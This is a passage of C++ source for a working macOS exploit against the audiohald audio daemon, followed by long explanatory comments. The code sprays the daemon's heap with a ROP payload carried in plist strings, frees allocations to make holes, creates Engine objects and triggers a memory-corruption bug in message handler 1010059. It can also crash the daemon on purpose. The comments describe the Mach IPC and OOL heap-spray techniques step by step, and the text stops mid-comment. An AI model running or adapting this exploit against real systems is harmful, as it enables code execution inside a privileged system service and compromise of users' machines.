    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_voucher_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010034;

    msg->object_id = created_devices.back();
    created_devices.pop_back();
    msg->mSelector = 'acom';
    msg->mScope = 'glob';
    msg->mElement = 0;
    msg->plist_length = strlen(data) + 1;

    mach_msg_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_setpropertydata_dplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
    
    delete msg;
    free(data);

    if (result != MACH_MSG_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error sending Mach message: %s\n" RESET, mach_error_string(result));
        return 1;
    }

    return 0;
}

/*
 * Triggers the vulnerability by sending message ID 1010059 (XIOContext_FetchWorkgroupPort).
 *
 * This message handler contains a memory corruption bug. When called on an Engine
 * object that has been set up through heap grooming, it may:
 *   - Dereference a dangling pointer
 *   - Access corrupted object data
 *   - Execute the ROP chain placed in heap memory
 *
 * The object_id parameter specifies which Engine object to target.
 */
void trigger_vulnerability(uint32_t object_id) {
    xiocontext_fetch_workgroup_port_mach_message *msg = new xiocontext_fetch_workgroup_port_mach_message;

    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_PORT_NULL, MACH_PORT_NULL, MACH_PORT_NULL);
    msg->header.msgh_size = sizeof(xiocontext_fetch_workgroup_port_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010059;  // XIOContext_FetchWorkgroupPort - THE VULNERABLE HANDLER

    msg->object_id = object_id;

    kern_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xiocontext_fetch_workgroup_port_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

    if (result != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error in mach_msg send and receive: %s\n" RESET, mach_error_string(result));
        delete msg;
        return;
    }

    delete msg;
}

/*
 * Enumerates all Engine objects and randomly selects one to exploit.
 *
 * Engine objects have type "ngnejboa" (reversed: "aobjenng" = "EngineObject").
 * Scanning object IDs 0x20-200 covers the typical range where these land.
 * A random selection adds unpredictability to exploitation attempts.
 */
uint32_t getRandomEngineObject() {
    uint32_t matches[1000];
    size_t count = 0;

    // Scan for Engine objects in the typical ID range
    for (uint32_t i = 0x20; i < 200; i++) {
        char *object_type = getObjectType(i);

        if (object_type) {
            if (!strcmp(object_type, "ngnejboa")) {  // "ngnejboa" = Engine object
                printf(GREEN " -> Found ENGN object at ID %d\n" RESET, i);
                matches[count++] = i;
            }
            free(object_type);
        }
    }

    if (count == 0) {
        printf(RED "‚ùå ENGN object not found, something is wrong...\n" RESET);
        exit(1);
    }

    // arc4random_uniform() - <stdlib.h> (macOS) - cryptographically secure random
    // Randomly select one of the found Engine objects
    uint32_t chosen = matches[arc4random_uniform(count)];
    printf(MAGENTA "üéØ Random ENGN object chosen to try to exploit: %d\n" RESET, chosen);
    return chosen;
}

/*
 * Initializes connection to audiohald.
 *
 * 1. Gets the bootstrap port from the kernel
 * 2. Looks up the audiohald service by name
 * 3. Sends XSystem_Open to register as a client
 */
void initialize() {
    // task_get_bootstrap_port() - <mach/mach.h>
    // Gets the bootstrap port which is used to look up system services
    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Failed to get bootstrap port, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "‚úÖ Got Bootstrap port! %d\n" RESET, bootstrap_port);

    // bootstrap_look_up() - <servers/bootstrap.h>
    // Looks up a Mach service by name, returns a send right to its port
    // This is how we get a connection to audiohald
    kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (kr != KERN_SUCCESS) {
        printf(RED "‚ùå bootstrap lookup failed, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "‚úÖ Got service port! %d\n" RESET, service_port);
    printf(BLUE "üëâ Initializing client...\n" RESET);
    sendInitializeClientMessage();
}

/*
 * getopt.h - Command-line argument parsing
 * Provides:
 *   - getopt_long()     : Parse long-form command line options (--flag)
 *   - struct option     : Long option definition structure
 *   - optarg            : Global pointer to current option's argument
 *   - required_argument : Option requires an argument
 *   - no_argument       : Option takes no argument
 */
#include <getopt.h>

/*
 * Prints command-line usage information.
 */
void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [options]\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --iterations <n>    Number of grooming iterations (default: 0)\n");
    fprintf(stderr, "  --allocs <n>        Allocations per iteration (default: 0)\n");
    fprintf(stderr, "  --frees <n>         Number of objects to free (default: 0)\n");
    fprintf(stderr, "  --objects <n>       Number of engine objects to create (default: 0)\n");
    fprintf(stderr, "  --pre-crash         Trigger a crash before main exploit attempts (default: false)\n");
    fprintf(stderr, "  --attempts <n>      Number of exploit attempts (default: 0)\n");
    fprintf(stderr, "  --help              Show this help message\n");
}

/*
 * Main entry point - orchestrates the exploitation phases.
 *
 * Usage: ./exploit [options]
 *   --iterations <n>  Number of heap spray iterations
 *   --allocs <n>      Allocations per iteration (payload copies in each plist)
 *   --frees <n>       Number of allocations to free (creates heap holes)
 *   --objects <n>     Number of Engine objects to create
 *   --pre-crash       Crash audiohald first to reset state
 *   --attempts <n>    Number of exploit trigger attempts
 *
 * Typical exploitation flow:
 *   ./exploit --iterations 100 --allocs 50 --frees 20 --objects 5 --attempts 10
 */
int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);  // Disable stdout buffering for real-time output

    // Exploitation parameters (set via command line)
    uint32_t num_frees = 0;           // How many allocations to free
    uint32_t num_engine_objects = 0;  // How many vulnerable objects to create
    uint32_t trigger_pre_crash = 0;   // Whether to crash audiohald first
    uint32_t num_attempts = 0;        // How many times to trigger the bug

    static struct option long_options[] = {
        {"iterations", required_argument, 0, 'i'},
        {"allocs",     required_argument, 0, 'a'},
        {"frees",      required_argument, 0, 'f'},
        {"objects",    required_argument, 0, 'o'},
        {"pre-crash",  no_argument,       0, 'c'},
        {"attempts",   required_argument, 0, 't'},
        {"help",       no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "i:a:f:o:ct:h", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'i': num_iterations = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'a': allocs_per_iteration = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'f': num_frees = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'o': num_engine_objects = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'c': trigger_pre_crash = 1; break;
            case 't': num_attempts = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'h': print_usage(argv[0]); return 0;
            default: print_usage(argv[0]); return 1;
        }
    }

    // Connect to audiohald and register as a client
    initialize();

    /*
     * PHASE 1: HEAP GROOMING
     * Fill the heap with controlled data (ROP payload embedded in plist strings).
     * This establishes a predictable heap layout.
     */
    if (num_iterations > 0) {
        printf(BLUE "\n--- HEAP GROOMING PHASE ---\n" RESET);
        printf("Performing %d iterations of %d allocations\n", num_iterations, allocs_per_iteration);
        sleep(2);
        doAllocations(num_iterations);
    }

    /*
     * PHASE 2: HOLE CREATION
     * Free some allocations to create gaps in the heap.
     * Subsequent allocations (Engine objects) may land in these freed regions.
     */
    if (num_frees > 0) {
        printf(BLUE "\n--- FREEING PHASE ---\n" RESET);
        if (num_frees > created_devices.size()) {
            num_frees = created_devices.size();
        }
        for (uint32_t i = 0; i < num_frees; i++) {
            printf("üï≥Ô∏è  Freeing allocation %d...\n", i + 1);
            freeAllocation();
        }
    }

    /*
     * PHASE 3: VULNERABLE OBJECT CREATION
     * Create Engine/Tap objects that contain the vulnerable code path.
     * These may land in the freed heap regions containing our ROP payload.
     */
    if (num_engine_objects > 0) {
        printf(BLUE "\n--- VULNERABLE OBJECT CREATION ---\n" RESET);
        createEngineObjects(num_engine_objects);
    }

    /*
     * OPTIONAL: PRE-CRASH
     * Crash audiohald to reset its state. When it respawns, existing
     * Engine objects from other processes may be in a different state.
     */
    if (trigger_pre_crash) {
        printf(MAGENTA "\nüí£ Triggering a crash so we can load new ENGN objects...\n" RESET);
        trigger_vulnerability(0x1);  // Invalid object ID causes crash
        printf(YELLOW "‚è≥ Triggered crash, waiting for coreaudiod to respawn...\n" RESET);
        sleep(5);
        initialize();  // Reconnect after respawn
    }

    /*
     * PHASE 4: EXPLOITATION ATTEMPTS
     * Repeatedly trigger the vulnerability on random Engine objects.
     * If heap grooming was successful, one of these triggers will
     * execute our ROP chain.
     */
    if (num_attempts > 0) {
        printf(BLUE "\n--- EXPLOIT ATTEMPT PHASE ---\n" RESET);
        for (uint32_t i = 0; i < num_attempts; i++) {
            printf(CYAN "\nüîé Attempt %d of %d: Enumerating ENGN objects in the Audio HAL...\n" RESET, i + 1, num_attempts);
            uint32_t engn_id = getRandomEngineObject();
            printf(MAGENTA "üí• Triggering vulnerability on it...\n" RESET);
            trigger_vulnerability(engn_id);
            printf(YELLOW "üò¥ Sleeping for 5 seconds...\n" RESET);
            sleep(5);  // Wait for potential crash/exploit effect
        }
    }

    printf(GREEN "\nüéâ All stages complete.\n" RESET);
    return 0;
}

/*
 * =============================================================================
 * APPENDIX: COMPLETE SYSTEM TRACE FOR KEY FUNCTIONS
 * =============================================================================
 *
 * This section documents the complete call chain from userspace to kernel
 * for each key function used in this exploit. References are from:
 *   - XNU kernel source (osfmk/, bsd/)
 *   - macOS SDK headers (/usr/include/)
 *   - libsyscall (Mach trap wrappers)
 *
 * =============================================================================
 * 1. mach_msg() - Core Mach IPC Primitive
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/message.h>
 *   Library:   libSystem.B.dylib (via libsyscall)
 *   Prototype: mach_msg_return_t mach_msg(
 *                mach_msg_header_t *msg,
 *                mach_msg_option_t option,
 *                mach_msg_size_t send_size,
 *                mach_msg_size_t rcv_size,
 *                mach_port_name_t rcv_name,
 *                mach_msg_timeout_t timeout,
 *                mach_port_name_t notify);
 *
 * CALL CHAIN:
 *   User: mach_msg()
 *     -> libsyscall: mach_msg() wrapper in libsyscall/mach/mach_msg.c
 *       -> Mach trap: mach_msg_trap (trap #-31)
 *         -> Kernel: mach_msg_trap() in osfmk/ipc/mach_msg.c
 *           -> ipc_kmsg_copyin() - copy message from userspace
 *           -> ipc_kmsg_send() - enqueue to destination port
 *           -> ipc_mqueue_send() - actual send to message queue
 *           -> [if receiving] ipc_mqueue_receive() - dequeue message
 *           -> ipc_kmsg_copyout() - copy message to userspace
 *
 * KEY KERNEL FILES:
 *   osfmk/ipc/mach_msg.c      - Main mach_msg implementation
 *   osfmk/ipc/ipc_kmsg.c      - Kernel message handling
 *   osfmk/ipc/ipc_mqueue.c    - Message queue operations
 *   osfmk/ipc/ipc_port.c      - Port operations
 *
 * MESSAGE FLOW:
 *   1. Userspace fills mach_msg_header_t with:
 *      - msgh_bits: port rights disposition
 *      - msgh_size: total message size
 *      - msgh_remote_port: destination (audiohald's service port)
 *      - msgh_local_port: reply port (or MACH_PORT_NULL)
 *      - msgh_id: message identifier (e.g., 1010034, 1010059)
 *
 *   2. Kernel validates and copies in the message
 *   3. For complex messages (MACH_MSGH_BITS_COMPLEX):
 *      - Copies OOL (out-of-line) memory descriptors
 *      - Transfers port rights as specified
 *   4. Message queued to destination port
 *   5. Destination (audiohald) receives via its mach_msg() call
 *
 * =============================================================================
 * 2. mach_port_allocate() - Create a New Mach Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_port.h> (via <mach/mach.h>)
 *   Prototype: kern_return_t mach_port_allocate(
 *                ipc_space_t task,
 *                mach_port_right_t right,
 *                mach_port_name_t *name);
 *
 * CALL CHAIN:
 *   User: mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port)
 *     -> MIG stub: _mach_port_allocate() generated from mach_port.defs
 *       -> Mach message to task's special port
 *         -> Kernel: mach_port_allocate() in osfmk/ipc/mach_port.c
 *           -> ipc_port_alloc() - allocate ipc_port structure
 *           -> ipc_entry_alloc() - allocate entry in IPC space
 *           -> Returns port name to userspace
 *
 * KEY KERNEL FILES:
 *   osfmk/ipc/mach_port.c     - Port manipulation routines
 *   osfmk/ipc/ipc_port.c      - Port structure allocation
 *   osfmk/ipc/ipc_entry.c     - IPC namespace entry management
 *   osfmk/ipc/ipc_space.c     - IPC space (namespace) management
 *
 * PORT RIGHTS:
 *   MACH_PORT_RIGHT_RECEIVE (1) - Can receive messages on this port
 *   MACH_PORT_RIGHT_SEND (0)    - Can send messages to this port
 *   MACH_PORT_RIGHT_SEND_ONCE (2) - One-time send right
 *
 * =============================================================================
 * 3. mach_port_insert_right() - Add Rights to a Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_port.h>
 *   Prototype: kern_return_t mach_port_insert_right(
 *                ipc_space_t task,
 *                mach_port_name_t name,
 *                mach_port_t poly,
 *                mach_msg_type_name_t polyPoly);
 *
 * CALL CHAIN:
 *   User: mach_port_insert_right(task, port, port, MACH_MSG_TYPE_MAKE_SEND)
 *     -> MIG stub -> Kernel: mach_port_insert_right()
 *       -> ipc_object_copyin() - validate source right
 *       -> ipc_object_copyout() - install in target space
 *
 * COMMON USAGE:
 *   After allocating a receive right, insert a send right to the same port
 *   so we can both send to and receive from it (bidirectional communication).
 *
 * =============================================================================
 * 4. bootstrap_look_up() - Service Port Discovery
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <servers/bootstrap.h>
 *   Library:   libxpc.dylib (wraps launchd communication)
 *   Prototype: kern_return_t bootstrap_look_up(
 *                mach_port_t bp,
 *                const name_t service_name,
 *                mach_port_t *sp);
 *
 * CALL CHAIN:
 *   User: bootstrap_look_up(bootstrap_port, "com.apple.audio.audiohald", &port)
 *     -> libxpc: Sends lookup request to launchd
 *       -> launchd: Finds registered service
 *         -> Returns send right to service's port
 *           -> User receives send right in *sp
 *
 * KEY POINTS:
 *   - bootstrap_port is inherited from parent process (set by kernel at exec)
 *   - launchd (PID 1) manages the bootstrap namespace
 *   - Services register with launchd via bootstrap_check_in()
 *   - Clients discover services via bootstrap_look_up()
 *
 * AUDIOHALD REGISTRATION:
 *   audiohald registers "com.apple.audio.audiohald" with launchd
 *   This gives us a send right to communicate with the daemon
 *
 * =============================================================================
 * 5. task_get_bootstrap_port() - Get Bootstrap Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_port.h> (via <mach/mach.h>)
 *   Prototype: kern_return_t task_get_bootstrap_port(
 *                task_t task,
 *                mach_port_t *bootstrap_port);
 *
 * CALL CHAIN:
 *   User: task_get_bootstrap_port(mach_task_self(), &bootstrap_port)
 *     -> MIG call to task's special port
 *       -> Kernel: Returns task->itk_bootstrap
 *
 * KEY POINTS:
 *   - Bootstrap port is set when a task is created
 *   - Typically inherited from parent, ultimately from launchd
 *   - This is the entry point to the Mach service namespace
 *
 * =============================================================================
 * 6. vm_allocate() - Allocate Virtual Memory
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/vm_map.h>
 *   Prototype: kern_return_t vm_allocate(
 *                vm_map_t target_task,
 *                vm_address_t *address,
 *                vm_size_t size,
 *                int flags);
 *
 * CALL CHAIN:
 *   User: vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE)
 *     -> Mach trap or MIG call
 *       -> Kernel: vm_allocate() in osfmk/vm/vm_user.c
 *         -> vm_map_enter() - insert mapping into VM map
 *           -> Allocates anonymous memory (zero-filled)
 *           -> Returns virtual address
 *
 * KEY KERNEL FILES:
 *   osfmk/vm/vm_user.c        - User-facing VM operations
 *   osfmk/vm/vm_map.c         - VM map manipulation
 *   osfmk/vm/vm_resident.c    - Physical page management
 *
 * FLAGS:
 *   VM_FLAGS_ANYWHERE (1) - Kernel chooses the address
 *   VM_FLAGS_FIXED (0)    - Use the specified address
 *
 * USAGE IN EXPLOIT:
 *   Allocates OOL (out-of-line) memory for Mach messages
 *   The kernel will map this memory into audiohald's address space
 *   when the message is received
 *
 * =============================================================================
 * 7. mach_task_self() - Get Current Task Port
 * =============================================================================
 *
 * USERSPACE INTERFACE:
 *   Header:    <mach/mach_init.h> (via <mach/mach.h>)
 *   Prototype: mach_port_t mach_task_self(void);
 *
 * IMPLEMENTATION:
 *   Actually a macro: #define mach_task_self() mach_task_self_
 *   mach_task_self_ is a global variable set at process startup
 *   Contains a send right to the current task's kernel task port
 *
 * KEY POINTS:
 *   - Provides access to task-level operations (memory, ports, threads)
 *   - Used as first argument to many mach_* functions
 *   - Set by dyld during process initialization
 *
 * =============================================================================
 * 8. CoreFoundation Plist Functions - Payload Encoding
 * =============================================================================
 *
 * CFArrayCreateMutable() / CFDictionaryCreateMutable()
 *   Header:    <CoreFoundation/CFArray.h>, <CoreFoundation/CFDictionary.h>
 *   Creates mutable collections for building plist structure
 *
 * CFStringCreateWithBytes()
 *   Header:    <CoreFoundation/CFString.h>
 *   Creates CFString from raw bytes with specified encoding
 *   Used to embed arbitrary binary data (ROP payload) as UTF-16 string
 *
 * CFPropertyListCreateData()
 *   Header:    <CoreFoundation/CFPropertyList.h>
 *   Serializes CFPropertyList (dict/array) to binary plist format
 *   This is the key function that encodes our payload for transmission
 *
 * PLIST ENCODING PATH:
 *   1. Load ROP payload bytes from rop_payload.bin
 *   2. Interpret bytes as UTF-16LE code units
 *   3. Create CFString from these "characters"
 *   4. Wrap in CFArray, then CFDictionary
 *   5. Serialize to binary plist via CFPropertyListCreateData()
 *   6. Send via Mach OOL descriptor to audiohald
 *   7. audiohald parses plist, allocating CFString with our payload bytes
 *
 * =============================================================================
 * 9. OOL (Out-of-Line) Memory Transfer
 * =============================================================================
 *
 * MECHANISM:
 *   Large data is transferred "out of line" rather than inline in the message.
 *   The mach_msg_ool_descriptor_t describes the memory region:
 *     - address: pointer to data in sender's address space
 *     - size: length in bytes
 *     - deallocate: whether to deallocate sender's copy after send
 *     - copy: MACH_MSG_VIRTUAL_COPY or MACH_MSG_PHYSICAL_COPY
 *
 * KERNEL HANDLING:
 *   1. Sender calls mach_msg() with OOL descriptor
 *   2. Kernel copies/maps OOL data from sender
 *   3. When receiver calls mach_msg(), kernel maps data into receiver
 *   4. Receiver gets pointer to mapped memory in their address space
 *
 * KEY KERNEL CODE:
 *   osfmk/ipc/ipc_kmsg.c:
 *     ipc_kmsg_copyin_ool_descriptor() - copyin OOL data
 *     ipc_kmsg_copyout_ool_descriptor() - copyout OOL data
 *
 * SECURITY IMPLICATIONS:
 *   OOL data ends up allocated in receiver's heap
 *   This is the basis for heap spraying attacks
 *   Controlled data lands at predictable heap locations
 *
 * =============================================================================
 * 10. Message ID Dispatch in audiohald
 * =============================================================================
 *
 * AUDIOHALD MESSAGE HANDLERS:
 *   The msgh_id field identifies which operation to perform:
 *
 *   1010000 - XSystem_Open
 *             Client registration, creates client state
 *
 *   1010002 - XSystem_GetObjectInfo
 *             Query object type by ID, used for enumeration
 *
 *   1010005 - XSystem_CreateMetaDevice
 *             Create aggregate audio device, used for heap grooming
 *
 *   1010034 - XObject_SetPropertyData (with plist)
 *             Set property data, used for heap spray (selector 'acom')
 *
 *   1010042 - XObject_GetPropertyData (with plist)
 *             Get property, but 'mktp' selector creates Engine/Tap object
 *
 *   1010059 - XIOContext_FetchWorkgroupPort
 *             THE VULNERABLE HANDLER - triggers memory corruption
 *
 * DISPATCH MECHANISM:
 *   audiohald has a MIG-generated dispatch table
 *   Each message ID maps to a handler function
 *   Message body is parsed according to expected structure
 *
 * =============================================================================
 * 11. Memory Corruption Trigger Point
 * =============================================================================
 *
 * VULNERABILITY:
 *   Message 1010059 (XIOContext_FetchWorkgroupPort) contains a bug
 *   When called on an Engine object:
 *     - May access freed/reallocated memory
 *     - May dereference controlled pointers
 *     - May call through controlled function pointers
 *
 * EXPLOITATION:
 *   1. Spray heap with ROP payload via plist allocations
 *   2. Free some allocations to create holes
 *   3. Create Engine objects that may land in controlled memory
 *   4. Trigger vulnerability - Engine object's memory contains ROP
 *   5. Controlled data treated as object, function pointer called
 *   6. ROP chain executes
 *
 * =============================================================================
 * END OF SYSTEM TRACE DOCUMENTATION
 * =============================================================================
 */

/*
 * #############################################################################
 * #############################################################################
 * ##                                                                         ##
 * ##            PART 2: DEEP TECHNICAL DOCUMENTATION                         ##
 * ##                                                                         ##
 * #############################################################################
 * #############################################################################
 *
 * This section provides atomic-level detail on every component of this exploit:
 *   - XNU Mach IPC kernel internals
 *   - Heap grooming theory and practice
 *   - ROP (Return-Oriented Programming) chain mechanics
 *   - Binary plist format and CFString internal storage
 *   - audiohald object model and memory layout
 *   - Exploitation primitives and control flow hijacking
 *
 * =============================================================================
 * =============================================================================
 * SECTION A: XNU MACH IPC KERNEL INTERNALS - COMPLETE DEEP DIVE
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * A.1 THE MACH MICROKERNEL ARCHITECTURE
 * -----------------------------------------------------------------------------
 *
 * XNU (X is Not Unix) is a hybrid kernel combining:
 *   - Mach 3.0 microkernel (CMU) - IPC, VM, threading
 *   - BSD 4.4 - POSIX APIs, networking, filesystems
 *   - I/O Kit - device drivers (C++ based)
 *
 * The Mach layer provides the fundamental IPC mechanism used by all macOS
 * services. Unlike Unix pipes/sockets, Mach IPC is capability-based:
 *   - "Ports" are kernel-managed communication endpoints
 *   - "Rights" are capabilities to send/receive on ports
 *   - Rights can be transferred between tasks (processes)
 *
 * KEY INSIGHT: Every system service on macOS (including audiohald) is reached
 * via Mach IPC. The kernel is the trusted intermediary for all communication.
 *
 * -----------------------------------------------------------------------------
 * A.2 PORT INTERNALS - struct ipc_port
 * -----------------------------------------------------------------------------
 *
 * A Mach port is represented in the kernel by struct ipc_port (osfmk/ipc/ipc_port.h):
 *
 *   struct ipc_port {
 *       struct ipc_object       ip_object;      // Base object (refcount, lock)
 *       struct ipc_mqueue       ip_messages;    // Queue of pending messages
 *       union {
 *           struct ipc_space   *receiver;       // Task that owns receive right
 *           struct ipc_port    *destination;    // For dead-name notifications
 *       } data;
 *       uint32_t                ip_mscount;     // Make-send count
 *       uint32_t                ip_srights;     // Send rights count
 *       uint32_t                ip_sorights;    // Send-once rights count
 *       // ... many more fields
 *   };
 *
 * MEMORY LAYOUT:
 *   - Ports are allocated from the kernel's zone allocator (kalloc)
 *   - Zone: "ipc ports" - fixed-size allocations for ipc_port structures
 *   - Port address is NEVER exposed to userspace (capability model)
 *
 * USERSPACE VIEW:
 *   - User sees "port names" (32-bit integers) not port addresses
 *   - Names are indices into the task's IPC space (namespace)
 *   - struct ipc_space contains hash table: name -> (port_ptr, rights_type)
 *
 * EXAMPLE:
 *   mach_port_t p = 0x1234;   // This is just a NAME, not an address
 *   Kernel lookup: task->itk_space->is_table[p] -> ipc_entry -> ipc_port*
 *
 * -----------------------------------------------------------------------------
 * A.3 MESSAGE STRUCTURE IN KERNEL - struct ipc_kmsg
 * -----------------------------------------------------------------------------
 *
 * When you call mach_msg(), the kernel creates an ipc_kmsg:
 *
 *   struct ipc_kmsg {
 *       struct ipc_kmsg        *ikm_next;       // Queue linkage
 *       struct ipc_kmsg        *ikm_prev;
 *       mach_msg_size_t         ikm_size;       // Total size
 *       struct ipc_port        *ikm_voucher;    // Voucher port
 *       mach_msg_header_t      *ikm_header;     // Points to message data
 *       // Inline data follows the header in the same allocation
 *   };
 *
 * MESSAGE DATA LAYOUT (within ikm_kmsg allocation):
 *
 *   +---------------------------+
 *   | ipc_kmsg header           |  <- struct ipc_kmsg fields
 *   +---------------------------+
 *   | mach_msg_header_t         |  <- ikm_header points here
 *   +---------------------------+
 *   | mach_msg_body_t           |  <- for complex messages (descriptor count)
 *   +---------------------------+
 *   | Descriptors[]             |  <- port/OOL memory descriptors
 *   +---------------------------+
 *   | Inline data               |  <- rest of message body
 *   +---------------------------+
 *
 * KERNEL PROCESSING FLOW:
 *
 *   1. ipc_kmsg_alloc(size)
 *      - Allocates from kalloc (kernel heap) based on message size
 *      - Small messages: inline in ipc_kmsg
 *      - Large messages: separate kalloc allocation for data
 *
 *   2. ipc_kmsg_copyin(kmsg, space, map, option)
 *      - Copies message header from userspace
 *      - Validates port names, converts to kernel port pointers
 *      - Processes descriptors:
 *        - Port descriptors: ipc_kmsg_copyin_port() - acquires port rights
 *        - OOL descriptors: ipc_kmsg_copyin_ool_descriptor() - maps/copies memory
 *
 *   3. ipc_kmsg_send(kmsg, option, timeout)
 *      - Enqueues message on destination port's message queue
 *      - May block if queue is full (MACH_SEND_TIMEOUT)
 *      - Wakes any thread waiting to receive
 *
 * -----------------------------------------------------------------------------
 * A.4 OUT-OF-LINE (OOL) MEMORY TRANSFER - CRITICAL FOR HEAP SPRAY
 * -----------------------------------------------------------------------------
 *
 * OOL memory is the key to heap spraying. Here's exactly how it works:
 *
 * SENDER SIDE (this exploit):
 *
 *   1. We allocate memory: vm_allocate(mach_task_self(), &oolBuffer, size, ...)
 *      - Creates virtual memory pages in OUR address space
 *      - Initially zero-filled (copy-on-write from zero page)
 *
 *   2. We fill it with ROP payload: memcpy(oolBuffer, payload, size)
 *      - Pages become "dirty" (owned by our process)
 *
 *   3. We send via mach_msg() with OOL descriptor:
 *      msg->descriptor[0].address = oolBuffer;
 *      msg->descriptor[0].size = size;
 *      msg->descriptor[0].deallocate = 0;  // Don't free our copy
 *      msg->descriptor[0].copy = MACH_MSG_VIRTUAL_COPY;  // COW if possible
 *
 * KERNEL PROCESSING (ipc_kmsg_copyin_ool_descriptor):
 *
 *   From osfmk/ipc/ipc_kmsg.c:
 *
 *   ipc_kmsg_copyin_ool_descriptor() {
 *       // Get the memory range from sender's address space
 *       vm_map_copy_t copy;
 *
 *       if (descriptor->copy == MACH_MSG_VIRTUAL_COPY) {
 *           // Use copy-on-write optimization
 *           kr = vm_map_copyin(sender_map,
 *                              (vm_map_address_t)descriptor->address,
 *                              (vm_map_size_t)descriptor->size,
 *                              FALSE,  // don't modify source
 *                              &copy);
 *       } else {
 *           // Physical copy - actually copies pages
 *           kr = vm_map_copyin(sender_map, addr, size, TRUE, &copy);
 *       }
 *
 *       // Store the copy object in the kernel message
 *       dsc->address = (void *)copy;
 *   }
 *
 * RECEIVER SIDE (audiohald):
 *
 *   When audiohald calls mach_msg() to receive:
 *
 *   ipc_kmsg_copyout_ool_descriptor() {
 *       vm_map_copy_t copy = (vm_map_copy_t)dsc->address;
 *
 *       // Map the copy into receiver's address space
 *       kr = vm_map_copyout(receiver_map, &addr, copy);
 *
 *       // Now 'addr' in audiohald's space contains our data!
 *       dsc->address = (void *)addr;
 *   }
 *
 * KEY POINTS FOR EXPLOITATION:
 *
 *   1. OOL data becomes a NEW ALLOCATION in audiohald's address space
 *   2. The allocation size is controlled by us (descriptor->size)
 *   3. The content is controlled by us (whatever we put in oolBuffer)
 *   4. For large enough allocations, vm_map_copyout uses vm_allocate
 *      which can hit specific allocator bins (nano, scalable, etc.)
 *
 * COPY-ON-WRITE BEHAVIOR:
 *
 *   - MACH_MSG_VIRTUAL_COPY: Kernel creates COW mapping
 *     - No physical copy until one side modifies the pages
 *     - Memory efficient but can be unpredictable for heap layout
 *
 *   - MACH_MSG_PHYSICAL_COPY: Kernel actually copies the pages
 *     - Guarantees separate physical pages
 *     - More predictable for heap exploitation
 *
 * -----------------------------------------------------------------------------
 * A.5 MESSAGE HEADER BITS - DETAILED BREAKDOWN
 * -----------------------------------------------------------------------------
 *
 * The msgh_bits field is complex. Here's the exact bit layout:
 *
 *   31                              0
 *   +--------+--------+--------+--------+
 *   | complex| voucher| local  | remote |
 *   +--------+--------+--------+--------+
 *       1       5        8        8      bits
 *
 * MACH_MSGH_BITS_SET(remote, local, voucher, complex) macro:
 *   - remote (bits 0-7): Disposition of remote (destination) port
 *   - local (bits 8-15): Disposition of local (reply) port
 *   - voucher (bits 16-20): Voucher port disposition
 *   - complex (bit 31): Set if message has descriptors
 *
 * PORT DISPOSITION VALUES:
 *
 *   MACH_MSG_TYPE_MOVE_RECEIVE (16):
 *     - Transfers receive right (only one can exist)
 *     - Sender loses the right after send
 *
 *   MACH_MSG_TYPE_MOVE_SEND (17):
 *     - Transfers send right
 *     - Sender loses one send right
 *
 *   MACH_MSG_TYPE_MOVE_SEND_ONCE (18):
 *     - Transfers send-once right
 *     - Right is consumed after one message
 *
 *   MACH_MSG_TYPE_COPY_SEND (19):
 *     - Copies send right (kernel creates new reference)
 *     - Sender keeps their send right
 *
 *   MACH_MSG_TYPE_MAKE_SEND (20):
 *     - Creates send right from receive right
 *     - Sender must hold receive right
 *
 *   MACH_MSG_TYPE_MAKE_SEND_ONCE (21):
 *     - Creates send-once right from receive right
 *
 * EXAMPLE FROM THIS EXPLOIT:
 *
 *   msg->header.msgh_bits = MACH_MSGH_BITS_SET(
 *       MACH_MSG_TYPE_COPY_SEND,       // We have send right to service_port
 *       MACH_MSG_TYPE_MAKE_SEND_ONCE,  // Create reply send-once from our port
 *       MACH_PORT_NULL,                // No voucher
 *       MACH_MSGH_BITS_COMPLEX         // We have OOL descriptors
 *   );
 *
 * -----------------------------------------------------------------------------
 * A.6 MESSAGE QUEUE OPERATIONS - ipc_mqueue
 * -----------------------------------------------------------------------------
 *
 * Each port has an associated message queue (ipc_mqueue):
 *
 *   struct ipc_mqueue {
 *       union {
 *           struct {
